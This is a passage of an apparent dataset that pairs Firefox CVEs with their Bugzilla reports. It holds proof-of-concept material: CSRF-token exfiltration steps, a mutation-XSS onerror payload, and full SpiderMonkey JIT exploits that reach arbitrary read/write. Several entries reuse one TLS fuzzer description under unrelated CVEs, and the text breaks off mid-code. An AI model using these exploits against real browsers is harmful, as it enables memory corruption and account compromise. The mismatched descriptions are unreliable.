directory openssl req -x509 -newkey rsa:2048 -nodes -sha256 -subj '/CN=localhost' -keyout localhost-privkey.pem -out localhost-cert.pem npm install express spdy node css-exfiltration-firefox.js Open Firefox and navigate to both https://localhost:3000 and https://127.0.0.1:3000 and trust the certificate. Go to https://localhost:3000 and press \"Copy\". Go to vulnerable page and paste it in the contenteditable box. See how the CSRF token is exfiltrated :) I will also attach the video of the attack."
      }
    ],
    "CVE-2019-17018": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1549394",
        "title": "Potential privacy leak from Win10 keyboard autocomplete of data entered in Private Browsing",
        "description": "Chrome is expected to fix a privacy leak from Incognito mode to normal browsing via the keyboard learning autocomplete data and exposing it in the normal browsing context. See https://hothardware.com/news/micrsoft-chromium-fixes (latter part). Basically, we should be using IS_PRIVATE as the input scope in Private Browsing on windows to avoid the Win10 keyboard from learning from input and offering as corrections or autocomplete data when we're not in Private Browsing. See https://docs.microsoft.com/en-us/windows/desktop/api/inputscope/ne-inputscope-inputscope"
      }
    ],
    "CVE-2019-17019": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1568003",
        "title": "On Windows, python files get executed instead of opened by notepad, because both Windows and the network suggest the file is text/plain, but ShellExecuteW will then open the file with python",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Steps to reproduce: Python need to be set in environment variables in client machine and in browser, in the application settings the content type as always ask.If some python code is there in google drive or office 365 and user clicks on download a pop up appears with 2 options - save file and open file. If user selects open file the python script will get executed. If the script is malicious it can perform malicious activity. Even it can connect remote server to download malicious file to file system. Actual results: Python script got executed by selecting open option. Expected results: Malicious code execution leading system compromise, change in OS level, delete of data etc."
      }
    ],
    "CVE-2019-17020": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1597645",
        "title": "Content-Security-Policy inline script execution is bypassed on XSL pages",
        "description": "I discovered this issue while implementing an XSL stylesheet on an RSS feed. Firefox (I am running version 70.0.1 on Windows 10) does not honour the Content-Security-Policy header on inline JavaScript given in an XSL template included by an XML file. I have made some test cases which I hope are helpful: https://traintimes.org.uk/firefox-csp/ shows the main issue I found - it is an XML file sent with a CSP header saying no inline JavaScript, but includes an XSL stylesheet containing a template with inline JavaScript that does run in Firefox (both the inline script and the inline event handler); https://traintimes.org.uk/firefox-csp/html.php is the same HTML, as the XSL template but served as HTML, and here you can see the inline JavaScript does not run in Firefox. In Chrome, you get the error: \"Refused to execute inline script because it violates the following Content Security Policy directive\" on both HTML and XML versions."
      }
    ],
    "CVE-2019-17021": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1599008",
        "title": "Race condition in firefox!sandbox::CopyPolicyToTarget leading to Information Disclosure of broker heap address",
        "description": "Hi, These issues only affects Windows client, I found two race condition in the shared memory of Firefox sandbox implementation. Information Disclosure of broker heap address in CopyPolicyToTarget (described in this issue) Memory corruption (Sandbox escape) in sandbox::SharedMemIPCServer::ThreadPingEventReady (described in issue 1599005) Vulnerability: Since Firefox (current version tested 70.0.1) configures the renderer sandbox with USER_LIMITED and Initial Integrity Level == Delayed Integrity Level (INTEGRITY_LEVEL_LOW), any renderer process can interact with other renderers process (read/write/createthread/duplicatehandles) even while new renderer process bootstrapping (when a new tab process is spawned). Google Chrome is not affected because the renderer processes runs with a USER_LOCKDOWN token (also the initial integrity level = LOW and delayed IL is UNTRUSTED) which prevent access to other renderer processes. The race condition vulnerability happens during new process bootstrapping, when a new tab process is created, the broker does: 1/ CreateProcess SUSPENDED with the lockdown token (USER_LIMITED for Firefox renderer) and low IL in TargetProcess::Create 2/ Assign target process to JOB object 3/ Change target thread token to initial token (USER_RESTRICTED_SAME_ACCESS) for initialisation later 4/ Create IPCServer shared memory in TargetProcess::Init 5/ DuplicateHandle the shared memory with the target in TargetProcess::Init 6/ Copy policy and update pointers in CopyPolicyToTarget So, the target process is suspended but other tabs are not and they can access the target process (thanks to USER_LIMITED token and same IL) and duplicate the IPC shared memory handle. A race condition exists when the policy is copied to the shared memory (containing broker heap addresses) before it updates policy->entry[i] pointers in CopyPolicyToTarget (6): void CopyPolicyToTarget(const void* source, size_t size, void* dest) { if (!source || !size) return; memcpy(dest, source, size); // (A) dest is shared memory and source contains broker heap pointers sandbox::PolicyGlobal* policy = reinterpret_cast<sandbox::PolicyGlobal*>(dest); size_t offset = reinterpret_cast<size_t>(source); for (size_t i = 0; i < sandbox::kMaxServiceCount; i++) { size_t buffer = reinterpret_cast<size_t>(policy->entry[i]); if (buffer) { buffer -= offset; policy->entry[i] = reinterpret_cast<sandbox::PolicyBuffer*>(buffer); // (B) remove the pointer base (race condition allows disclosure of heap address) } } } Source code: https://github.com/mozilla/gecko-dev/blob/master/security/sandbox/chromium/sandbox/win/src/target_process.cc#L33 So, a compromised renderer can read the policy entries pointers before they are updated and it discloses broker heap addresses. Repro: The provided POC (attachment payload_infoleak) often triggers the vulnerability. Install Python 2.7 64 bits and PythonForWindows (https://github.com/hakril/PythonForWindows) then run inject.py with the payload_infoleak.dll path. Debug the injected tab to verify the information disclosure (in debug output). Then start new tabs to trigger the vulnerability (like a regular user would do) until it works. RaceItLeak entry Leaked worked: dp payload_infoleak!leak_heap L1: 0000022D3486B198 (4220.3bdc): Break instruction exception - code 80000003 (first chance) KERNELBASE!wil::details::DebugBreak+0x2: 00007ff9`b3720192 cc int 3 The address is a valid heap address in the broker process (you can verify using !address in the broker). This information disclosure vulnerability allows an attacker to collect information that discloses the memory layout. In turn the attacker could use this information to deliver tailored exploits to bypass memory protection technologies such as ASLR for an additional LPE/RCE vulnerability. Thank you"
      }
    ],
    "CVE-2019-17022": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1602843",
        "title": "Mutation XSS via copy-and-paste in WYSIWYG editors",
        "description": "I've been recently analyzing copying and pasting in browsers and found a bug similar to bug 1599181, but this one allows a mutation XSS on pasting. The webpage needs to follow some specific pattern to be vulnerable but I could find some quite easily. The root of the issue is exactly the same as it was in bug 1599181, that is serializing of CSS. To recap, if pasted content contains <style> tag, Firefox decides to sanitize it. The stylesheet is pasted verbatim if it doesn't contain any \"dangerous\" rules (like @import), but it is rewritten if it does. Consider the following example: <style> @import''; @font-face { font-family: 'ab<\\/style><img src onerror=alert(1)>'} </style> Because of @import, after pasting, the code would be sanitized to: <style> @font-face { font-family: \"ab</style><img src onerror=alert(1)>\"; } </style> Please note how <\\/style> was transformed to </style>. This doesn't introduce any issue by itself because in the case above, the text node of the stylesheet is modified directly, hence the </style> inside doesn't close the tag. However, if the application does something akin to: textEditor.innerHTML = clipboardData.innerHTML; then it is vulnerable to XSS, because the <img> tag would leave the <style> tag. It was my assumption that certain applications might do that and by quick googling I found two WYSIWYG editors who do exactly this. So perhaps there are even more. Proof of Concept Go to https://jsbin.com/xivapasere/1/edit?html,output. Press copy me. Go to https://rawgit.com/alohaeditor/Aloha-Editor/hotfix/src/demo/boilerplate/ (one of the editors that's vulnerable to this mutation XSS). Give Aloha Editor a while to load... Go to any contenteditable content. Paste from clipboard. Alert fires! I don't consider it a bug in Aloha Editor, more of a bug in Firefox itself. To understand why alert fired, have a look at https://rawgit.com/alohaeditor/Aloha-Editor/hotfix/src/plugins/common/paste/lib/paste-plugin.js - line 274. What the editor does is that it paste the content in an invisible <div> (called $clipboard or $CLIPBOARD in the code). Then, using jQuery, the code is parsed as HTML: if (typeof content === 'string') { $content = $('<div>' + content + '</div>'); } else if (content instanceof $) { $content = $('<div>').append(content); } In the PoC content is equal to \"<style>@font-face { font-family: \\\"ab</style><img src onerror=alert(1)>\\\"; }</style>\", leading to an obvious XSS issue. I think that perhaps Firefox sanitizer could always escape < to \\3c in CSS strings to get rid of the issue? For the record, I've also reported certain copy-and-paste bugs to Chromium and they decided to go a different way altogether and they just delete <style> tag from pasted content by serializing it into inline style attributes. I think that it significantly reduces the risk. Safari also does the same. Here's the approach pasted from Chromium patch: This patch follows the same approach as in WebKit [1]: - First create a dummy document to insert the markup - Then computes style and layout in the dummy document - Re-serialize the dummy document as the markup to be inserted. This reuses the code path that we serialize a selection range into clipboard, where we need to serialize element computed style into inline styles so that the element styles are preserved. - Make sure all style elements are removed before inserting markup into document"
      }
    ],
    "CVE-2019-17023": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1590001",
        "title": "tls-server-no_fuzzer_mode: ASSERT: ss->ssl3.hs.ws == wait_client_hello, at ../../lib/ssl/ssl3con.c:12805",
        "description": "The fuzzer found an issue. Marking this as critical as it appears to be a state machine issue in TLS 1.3 (ssl3con.c:12805), i.e. the state is ssl_ct_application_data and ssl_0rtt_ignore_hrr while not waiting for a client hello (wait_client_hello). I recommend removing the offending code change https://hg.mozilla.org/projects/nss/rev/bc77cf318f388f55790b99d5f23a9c1f2bd9f900?revcount=10000, i.e. disable TLS 1.3 again until the issue is fixed. To reproduce build nss with ./build.sh --fuzz --asan and run LD_LIBRARY_PATH=../dist/Debug/lib/ nssfuzz-tls-server testcase."
      }
    ],
    "CVE-2019-17025": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1328295%2C1328300%2C1590447%2C1590965%2C1595692%2C1597321%2C1597481",
        "description": "The fuzzer found an issue. Marking this as critical as it appears to be a state machine issue in TLS 1.3 (ssl3con.c:12805), i.e. the state is ssl_ct_application_data and ssl_0rtt_ignore_hrr while not waiting for a client hello (wait_client_hello). I recommend removing the offending code change https://hg.mozilla.org/projects/nss/rev/bc77cf318f388f55790b99d5f23a9c1f2bd9f900?revcount=10000, i.e. disable TLS 1.3 again until the issue is fixed. To reproduce build nss with ./build.sh --fuzz --asan and run LD_LIBRARY_PATH=../dist/Debug/lib/ nssfuzz-tls-server testcase."
      }
    ],
    "CVE-2019-9788": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1518001%2C1521304%2C1521214%2C1506665%2C1516834%2C1518774%2C1524755%2C1523362%2C1524214%2C1529203",
        "description": "The fuzzer found an issue. Marking this as critical as it appears to be a state machine issue in TLS 1.3 (ssl3con.c:12805), i.e. the state is ssl_ct_application_data and ssl_0rtt_ignore_hrr while not waiting for a client hello (wait_client_hello). I recommend removing the offending code change https://hg.mozilla.org/projects/nss/rev/bc77cf318f388f55790b99d5f23a9c1f2bd9f900?revcount=10000, i.e. disable TLS 1.3 again until the issue is fixed. To reproduce build nss with ./build.sh --fuzz --asan and run LD_LIBRARY_PATH=../dist/Debug/lib/ nssfuzz-tls-server testcase."
      }
    ],
    "CVE-2019-9789": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1520483%2C1522987%2C1528199%2C1519337%2C1525549%2C1516179%2C1518524%2C1518331%2C1526579%2C1512567%2C1524335%2C1448505%2C1518821",
        "description": "The fuzzer found an issue. Marking this as critical as it appears to be a state machine issue in TLS 1.3 (ssl3con.c:12805), i.e. the state is ssl_ct_application_data and ssl_0rtt_ignore_hrr while not waiting for a client hello (wait_client_hello). I recommend removing the offending code change https://hg.mozilla.org/projects/nss/rev/bc77cf318f388f55790b99d5f23a9c1f2bd9f900?revcount=10000, i.e. disable TLS 1.3 again until the issue is fixed. To reproduce build nss with ./build.sh --fuzz --asan and run LD_LIBRARY_PATH=../dist/Debug/lib/ nssfuzz-tls-server testcase."
      }
    ],
    "CVE-2019-9790": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1525145",
        "title": "Use After Free In HTMLTableElment::DeleteCaption",
        "description": "I found a use after free by code review and have wrote a crashing proof of concept. Also there are at least two other use after frees in the same class. The problem is a raw pointer to a caption element is obtained. Its then passed to RemoveChild() which dispatches a sync DOMNodeRemoved event. I've attached a simple proof of concept. Wait for the page to load and then mouse over the table. Click the alert box and firefox should crash. This like pretty old code so I bet most versions of firefox are effected. Also there are at least two other use after frees in that file. I'll open up separate bug reports for those. It could be modified to where you don't have to mouse over the table to and click the alert box to trigger to the bug but I've worked so long and hard to try and find a bug and I finally found one so I'm reporting it ASAP!. In order to fix this issue I would recommend taking a strong reference to the caption object so it cant be removed. HTMLTableElement::DeleteCaption() { HTMLTableCaptionElement* caption = GetCaption(); if (caption) { mozilla::ErrorResult rv; nsINode::RemoveChild(*caption, rv); MOZ_ASSERT(!rv.Failed()); } }"
      }
    ],
    "CVE-2019-9791": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1530958",
        "title": "Spidermonkey: IonMonkey's type inference is incorrect for constructors entered via OSR",
        "description": "A bug in IonMonkeys type inference system when JIT compiling and entering a constructor function via on-stack replacement (OSR) allows the compilation of JITed functions that cause type confusions between arbitrary objects. Prerequisites: Spidermonkey can represent \"plain\" objects either as NativeObject or as UnboxedObjects. NativeObjects are basically two pointers to type information objects (the \"Group\" and \"Shape\") as well as inline and out-of-line properties (both stored in NaN-boxed form) and elements. UnboxedObject, on the other hand, can store their properties in unboxed form, e.g. as native 32-bit integer or even 8-bit booleans. An UnboxedObject can always be converted to a NativeObject (by boxing the properties and potentially allocating out-of-line storage). This e.g. happens if, during a property assignment, the type of the new value mismatches the current type of the property. The function implementing the conversion can be found here. Spidermonkey can track the possible types of object properties for the purpose of type inference. For example, after executing the following code (and assuming no other code ran that assigned a different value to a property .x), Spidermonkey will know that the property .x will always be a Uint8Array and uses that information to omit type checks in JIT compiled code. var o = {}; o.x = new Uint8Array(0x1000); Assigning a value of a different type to such a property will invalidate (or widen) the inferred type and potentially invalidate any JITed code that relies on that. A constructor in Spidermonkey can have a \"template\" type (Group and potentially Shape) associated with it which represents the type of the constructed objects after initialization has finished. The caller of such a constructor is responsible for allocating the newly constructed object of the final type (via js::CreateThisForFunction) and passing it as argument to the constructor. As such, JITed code for a constructor can rely on receiving an object of the template type and can use that to emit code for property stores to existing properties instead of code for property definitions (which in addition to writing the property value also have to update the Shape of the object). As an example, consider the following constructor function: function Ctor() { this.a = 42; this.b = 43; } After several invocations, the type inference system will compute the final type of the constructed objects. In that case it could be UnboxedObject with two integer properties, .a and .b. At a later point IonMonkey would start JIT compiling the constructor. By relying on the fact that the caller will always pass in an object with the template type, IonMonkey can now emit code that simply stores the two values into the existing property slots. This optimization is only possible if Spidermonkey can prove that the constructed object doesn't escape the local scope before the final property definition (and so the existence of the properties before they are actually defined in the code isn't visible to the running script). The result type for constructors is computed here. Bug Description The following program, when run in Spidermonkey built from current release, results in observable misbehaviour: it doesn't show the property .x even though it should exist. Slight mutations of it can also result in nullderef crashes when assigning the property .x, which is how the original sample was found during fuzzing. function Hax(val, l) { this.a = val; for (let i = 0; i < l; i++) {} this.x = 42; } for (let i = 0; i < 1000; i++) { new Hax(1337, 1); } let obj = new Hax(\"asdf\", 100000); console.log(Object.getOwnPropertyNames(obj)); // prints only \"a\" It appears that the following is happening here: During repeated invocations in the outer loop, Spidermonkey's type inference system computes the resulting type for the constructed objects: an UnboxedObject with properties .a and .x of type integer. The constructor is then JIT compiled by IonMonkey, which makes use of the type inference to emit code for property stores to existing properties instead of property definitions. During the final invocation, the JIT code attempts to set the property .a. However, the value now has the wrong type (string instead of integer) for the object. This triggers the following: The current |this| object is converted to a NativeObject, which has the properties .a and .x The result type for Hax is updated to now be a NativeObject with the two properties .a and .x (as the type inference for the constructor can still prove that both .a and .x will always be installed) The |this| object is then \"rolled back\" to the type it should currently have at this position in the bytecode. Afterwards, the Shape of |this| only indicates the existence of property .a (which is correct at the current position in the code). Presumably, this is done to avoid a situation in which script code can suddenly observe that the constructed object already has the final set of properties before they are defined in the code, which could e.g. happen if the initial analysis relied on the assumption that some function or method called in the constructor was always a specific, known function and inlined it. Due to the type inference change, the JIT code is deoptimized and execution continues in the baseline JIT. In the following loop, IonMonkey again starts compiling Hax, and enters into the JITed code via on-stack replacement (OSR) in the middle of the function at the head of the loop. During compilation, IonMonkey again relies on the \"template\" type for Hax and concludes that |this| must be a NativeObject with properties .a and .x. This is incorrect in this situation, as the rollback has removed the property .x. After the loop finishes, the JITed code only performs the property stores as it believes that the object already has the final Shape. As such, the property store to .x is \"forgotten\" and Object.getOwnPropertyNames only shows the existence of property .a Exploitation The JITed code after OSR expects |this| to already have the final type and thus only stores the property without updating the Shape. As a result, .x will not be visible and the next property defined on the constructed object afterwards will be assigned the same slot that .x was written into in the JITed code. With that, the following exploit becomes possible, which abuses the type inference mechanism for properties: In the JITed code, after the loop: Define a property .x on |this| as above. The compiler will infer the type of .x to be type X. This property will then be \"forgotten\" in the final call due to the bug. Define a new property (of type Y) on the object. It will be stored into the same slot as .x (because that slot is free according the the object's Shape). This has to be a \"slow path\" property definition that doesn't rely on type inference and instead inspects the Shape of the object and determines the next free slot based on that. Load property .x again. The compiler will infer the type of the loaded value to be X. However, it will actually load an object of type Y As a result, it is now possible to compile JIT code that confuses an object of type X with an object of type Y where both X and Y can be arbitrarily chosen. The following JavaScript program (tested against a local Spidermonkey build and Firefox 65.0.1) demonstrates this idea. It first triggers the type confusion between a Float64Array and a custom UnboxedObject, then gains arbitrary read/write from that, and finally crashes when writing to 0x414141414141: let ab = new ArrayBuffer(0x1000); let victim = new Uint8Array(0x1000); function Hax(val, l, trigger) { // In the final invocation: // Ultimately confuse these two objects which each other. // x will (eventually) be an UnboxedObject, looking a bit like an ArrayBufferView object... :) let x = {slots: 13.37, elements: 13.38, buffer: ab, length: 13.39, byteOffset: 13.40, data: []}; // y is a real ArrayBufferView object. let y = new Float64Array(0x1000); // * Trigger a conversion of |this| to a NativeObject. // * Update Hax's template type to NativeObject with .a and .x (and potentially .y) // * Trigger the \"roll back\" of |this| to a NativeObject with only property .a // * Bailout of the JITed code due to type inference changes this.a = val; // Trigger JIT compilation and OSR entry here. During compilation, IonMonkey will // incorrectly assume that |this| already has the final type (so already has property .x) for (let i = 0; i < l; i++) {} // The JITed code will now only have a property store here and won't update the Shape. this.x = x; if (trigger) { // This property definition is conditional (and rarely used) so that an inline cache // will be emitted for it, which will inspect the Shape of |this|. As such, .y will // be put into the same slot as .x, as the Shape of |this| only shows property .a. this.y = y; // At this point, .x and .y overlap, and the JITed code below believes that the slot // for .x still stores the UnboxedObject while in reality it now stores a Float64Array. } // This assignment will then corrupt the data pointer of the Float64Array to point to |victim|. this.x.data = victim; } for (let i = 0; i < 1000; i++) { new Hax(1337, 1, false); } let obj = new Hax(\"asdf\", 10000000, true); // Driver is now a Float64Array whose data pointer points to a Uint8Array. let driver = obj.y; // Write to address 0x414141414141 as PoC driver[7] = 3.54484805889626e-310; victim[0] = 42; Please note: this bug is subject to a 90 day disclosure deadline. After 90 days elapse or a patch has been made broadly available (whichever is earlier), the bug report will become visible to the public. With any fix, please give credit for identifying the vulnerability to Samuel Groß of Google Project Zero."
      }
    ],
    "CVE-2019-9792": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1532599",
        "title": "Spidermonkey: IonMonkey leaks JS_OPTIMIZED_OUT magic value to script",
        "description": "IonMonkey can, during a bailout, leak an internal JS_OPTIMIZED_OUT magic value to the running script. This magic value can then be used to achieve memory corruption. Prerequisites Magic Values Spidermonkey represents JavaScript values with the C++ type JS::Value, which is a NaN-boxed value that can encode a variety of different types such as doubles, string pointers, integers, or object pointers. Besides the types available in JavaScript, JS::Value can also store special (\"magic\") values for various internal purposes. For example, JS_ELEMENTS_HOLE is used to represent holes in arrays, and JS_OPTIMIZED_ARGUMENTS represents the arguments object during a function call (so that no actual memory allocation is required for it). Branch Pruning IonMonkey (Spidermonkey's JIT engine) represents JavaScript code as a control-flow graph (CFG) of MIR (mid-level IR) instructions. When starting to compile a function, IonMonkey first translates the bytecode to MIR, keeping the same CFG. Afterwards, it tries to remove subtrees in the CFG that appear to not be used in order to save compilation time and potentially improve the result of various optimizations performed later. As an example, consider the following code, and assume further that in all previous executions only the if branch had been taken: if (cond_that_has_always_been_true) { // do something } else { // do something else } In this case, branch pruning would likely decide to discard the else branch entirely and instead replace it with a bailout instruction to bailout to the baseline JIT should the branch ever be taken: if (cond_that_has_always_been_true) { // do something } else { bailout(); // will continue execution in baseline JIT } Phi Elimination IonMonkey's MIR uses static single assignment (SSA) form. In SSA form, every variable is assigned exactly once. Reassignments of variables on different branches in the CFG are handled with special Phi instructions. Consider the following example: var x; if (c) { x = 1337; } else { x = 1338; } print(x); After translation to SSA form it would look something like this: if (c) { x1 = 1337; } else { x2 = 1338; } x3 = Phi(x1, x2); print(x3); Phi Elimination is an optimization pass that tries to remove Phi instructions that are either redundant or unobservable (which frequently appear as result of SSA conversion and various optimizations). Quoting from the source code: // Eliminates redundant or unobservable phis from the graph. A // redundant phi is something like b = phi(a, a) or b = phi(a, b), // both of which can be replaced with a. An unobservable phi is // one that whose value is never used in the program. Unobservalbe Phis are then replaced a special value, MagicOptimizedOut. In case of a bailout from the JIT, such an optimized-out value will be materialized as a JS_OPTIMIZED_OUT JS magic value. This should not be observable by script since the compiler was able to prove that the variable is never used. Spidermonkey can, however, not simply leave the slot for an optimized-out variable uninitialized as e.g. the garbage collector expects a valid JS::Value in it. Phi elimination can lead to problems in combination with branch pruning. Consider the following example: var only_used_in_else_branch = ...; if (cond_that_has_always_been_true) { // do something, but don't use only_used_in_else_branch } else { // do something else and use only_used_in_else_branch } Here again, branch pruning might decide to remove the else branch, in which case no use of the variable remains. As such, it would be replaced by a magic JS constant (JS_OPTIMIZED_OUT) in the JIT. Later, if the else branch was actually taken, the JIT code would perform a bailout and try to restore the variable. However, as it has been removed, it would now (incorrectly) restore it as JS_OPTIMIZED_OUT magic and continue using it in the baseline JIT, where it could potentially be observed by the executing script. To avoid this, branch pruning marks SSA variables that are used in removed blocks as \"useRemoved\", in which case the variables will not be optimized out. Bug Description While fuzzing Spidermonkey, I encountered the following sample which crashes Spidermonkey built from the current release branch: function poc() { const x = \"adsf\"; for (let v7 = 0; v7 < 2; v7++) { function v8() { let v13 = 0; do { v13++; } while (v13 < 1200000); } const v15 = v8(); for (let v25 = 0; v25 < 100000; v25++) { if (x) { } else { const v26 = {get:v8}; for (let v30 = 0; v30 < 1000; v30++) { } } } } } poc(); It appears what is happening here is roughly the following: At the beginning of JIT compilation (somewhere in one of the inner loops), IonMonkey produces the following simplified CFG (annotated with the different SSA variables for x): +-------+ | 0 +-----+ | Entry | | +-------+ | x1 = \"asdf\" v +-----------+ | 1 | +--------------->| Loop Head | | +--+--------+ | | x2 = Phi(x1, x5) | +--------+ | v | +-----------+ +------------+ | | 3 | | 2... | | | OSR Entry | | Inlined v8 | | +-+---------+ +----------+-+ | | x3 = osrval('x') | | +---------+ +----------+ | v v | +-------------+ | | 4 | | | Merge | | +-----------+-+ | x4 = Phi(x3, x2) | | v | +-------------+ | | 5... | +-----------+ Inner Loop | +-------------+ x5 = Phi(x4, ..); use(x5); Since the function is already executing in the baseline JIT, the JIT code compiled by IonMonkey will likely be entered via OSR at block 3 in the middle of the outer loop. After producing the initial MIR code, IonMonkey performs branch pruning. During branch pruning, IonMonkey inspects the hit count of the bytecode (and performs some more heuristics), and decides that block 3 (or really the exit from the loop in v8) should be pruned and replaced with a bailout to the baseline JIT. The CFG then looks something like this: +-------+ | 0 +-----+ | Entry | | +-------+ | x1 = \"asdf\" v +-----------+ | 1 | +--------------->| Loop Head | | +--+--------+ | | x2 = Phi(x1, x5) | +--------+ | v | +-----------+ +------------+ | | 3 | | 2... | | | OSR Entry | | Inlined v8 | | +-+---------+ +------------+ | | x3 = osrval(1) | +---------+ !! branch pruned !! | v | +-------------+ | | 4 | | | Merge | | +-----------+-+ | x4 = Phi(x3) | | v | +-------------+ | | 5... | +-----------+ Inner Loop | +-------------+ x5 = Phi(x4, ..); use(x5); Since there was no use of x2 in the removed code, x2 is not marked as \"use removed\". However, when removing the branch 2 -> 4, IonMonkey also removed x2 as input to the Phi for x4 as there is no longer a path between block 1 and block 4. This removal of a use without setting the useRemoved flag then leads to problems later on, in particular during Phi Elimination, which changes the code to the following: +-------+ | 0 +-----+ | Entry | | +-------+ | x1 = \"asdf\" v +-----------+ | 1 | +--------------->| Loop Head | | +--+--------+ | | x2 = OPTIMIZED_OUT | +--------+ | v | +-----------+ +------------+ | | 3 | | 2... | | | OSR Entry | | Inlined v8 | | +-+---------+ +------------+ | | x3 = osrval(1) | +---------+ !! branch pruned !! | v | +-------------+ | | 4 | | | Merge | | +-----------+-+ | x4 = Phi(x3) | | v | +-------------+ | | 5... | +-----------+ Inner Loop | +-------------+ x5 = Phi(x4, ..); use(x5); Here, Phi Elimination decided that x2 is an unobservable Phi as it is not used anywhere. As such, it replaces it with a MagicOptimizedOut value. However, when block 2 is executed in the JITed code, it will perform a bailout and restore x as JS_OPTIMIZED_OUT magic value. This is incorrect as the interpreter/baseline JIT will use x once it reaches the inner loop. There, x (now the optimized out magic) is used for a ToBoolean conversion, which crashes (in a non exploitable way) when reaching this code: JS_PUBLIC_API bool js::ToBooleanSlow(HandleValue v) { ...; MOZ_ASSERT(v.isObject()); return !EmulatesUndefined(&v.toObject()); // toObject will return an invalid pointer for a magic value } A similar scenario is described in FlagPhiInputsAsHavingRemovedUses, which is apparently supposed to prevent this from happening by marking x2 as useRemoved during branch pruning. However, in this case, FlagPhiInputsAsHavingRemovedUses fails to mark x2 as useRemoved as it concludes that x4 is also unused: basically, FlagPhiInputsAsHavingRemovedUses invokes DepthFirstSearchUse to figure out whether some Phi is used by performing a depth-first search over all uses. If it finds a non-Phi use, it returns true. In block 5 above (which are really multiple blocks), x4 is used by another Phi, x5, which is then used by a \"real\" instruction. DepthFirstSearchUse now visits x5 and puts it into the worklist. It then eventually finds x4 and: finds x5 as use, but as x5 is already in the worklist it skips it finds no other uses, and thus (incorrectly?) marks x4 as unused As such, x2 is later on not marked as useRemove since its only use (x4) appears to be unused anyways. Exploitation It is possible get a reference to the magic JS_OPTIMIZED_OUT value by changing the body of the inner for loop to something like this: for (let v25 = 0; v25 < 100000; v25++) { // Should never be taken, but will be after triggering the bug (because both v3 and v1 // will be a JS_OPTIMIZED_OUT magic value). if (v3 === v1) { let magic = v3; console.log(\"Magic is happening!\"); // do something with magic return; } if (v1) { } else { const v26 = {get:v8}; for (let v30 = 0; v30 < 1000; v30++) { } } } Afterwards, the magic value will be stored in a local variable and can be freely used. What remains now is a way to use the magic value to cause further misbehaviour in the engine. Spidermonkey uses different magic values in various places. These places commonly check for the existence of some specific magic value by calling .isMagic(expectedMagicType) on the value in question. For example, to check for the magic hole element, the code would invoke elem.isMagic(JS_ELEMENTS_HOLE). The implementation of isMagic is shown below: bool isMagic(JSWhyMagic why) const { MOZ_ASSERT_IF(isMagic(), s_.payload_.why_ == why); return isMagic(); } Interestingly, this way of implementing it makes it possible to supply a different magic value than the expected one while still causing this function to return true, thus making the caller believe that it has the right magic value. As such, the JS_OPTIMIZED_OUT magic value can, in many cases, be used as any other magic value in the code. One interesting use of magic values is JS_OPTIMIZED_ARGUMENTS, representing the arguments object. The idea is that e.g. function foo() { print(arguments[0]); } Gets compiled to bytecode like this: push JS_OPTIMIZED_ARGUMENTS LoadElem 0 call print The special handling for the magic value is then performed here: static bool DoGetElemFallback(JSContext* cx, BaselineFrame* frame, ICGetElem_Fallback* stub, HandleValue lhs, HandleValue rhs, MutableHandleValue res) { // ... bool isOptimizedArgs = false; if (lhs.isMagic(JS_OPTIMIZED_ARGUMENTS)) { // Handle optimized arguments[i] access. if (!GetElemOptimizedArguments(cx, frame, &lhsCopy, rhs, res, &isOptimizedArgs)) { return false; } // ... Which eventually ends up in: inline Value& InterpreterFrame::unaliasedActual( unsigned i, MaybeCheckAliasing checkAliasing) { MOZ_ASSERT(i < numActualArgs()); MOZ_ASSERT_IF(checkAliasing, !script()->argsObjAliasesFormals()); MOZ_ASSERT_IF(checkAliasing && i < numFormalArgs(), !script()->formalIsAliased(i)); return argv()[i]; // really is just argv_[i]; } An InterpreterFrame is an object representing the invocation context of a JavaScript function. Basically, there are two types of InterpreterFrames: CallFrames, which are used for regular function calls and thus have the nactul_ (the number of arguments) and argv_ (a pointer to the argument values) members initialized, and ExecuteFrames, which are e.g. used for eval()ed code. Interestingly, ExecuteFrames leave nactual_ and argv_ uninitialized, which is normally fine as code would never access these fields in an ExecuteFrame. However, by having a reference to a magic value, it now becomes possible to trick the engine into believing that whatever frame is currently active is a CallFrame and thus has a valid argv_ pointer by loading an element from the magic value (magic[i] in JS). Conveniently, InterpreterFrames are allocated by a bump allocator, used solely for the interpreter stack. As such, the allocations are very deterministic and it is easily possible to overlap the uninitialized member with any other data that is stored on the interpreter stack, such as local variables of functions. The following PoC (tested against a local Spidermonkey build and Firefox 65.0.1) demonstrates this. It will first trigger the bug to leak the magic JS_OPTIMIZED_OUT value. Afterwards, it puts a controlled value (0x414141414141 in binary) on the interpreter stack (in fill_stack), then uses the magic value from inside an eval frame of which the argv_ pointer overlaps with the controlled value. Spidermonkey will then assume that the current frame must be a FunctionFrame and treat the value as an argv_ pointer, thus crashing at 0x414141414141. // This function uses roughly sizeof(InterpreterFrame) + 14 * 8 bytes of interpreter stack memory. function fill_stack() { // Use lot's of stack slots to increase the allocation size of this InterpreterFrame. var v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13; // Will overlap with the argv_ pointer in the InterpreterFrame for the call to eval. var v14 = 3.54484805889626e-310; } // This function uses roughly sizeof(InterpreterFrame) bytes of interpreter stack memory. The inner // call to eval will get its own InterpreterFrame, which leaves the argv_ pointer uninitialized // (since it's an eval frame). However, due to having a magic value here, it is possible to trick // the interpreter into accessing argv_ (because it assumes that the magic value represents an // `arguments` object). The argv_ pointer of the inner frame will then overlap with one of the // variables of the previous function, and is thus fully controllable. function trigger(magic) { eval(`magic[0]`); } // Invoke the two functions above to achieve memory corruption given a magic JS::Value. function hax(magic) { fill_stack(); 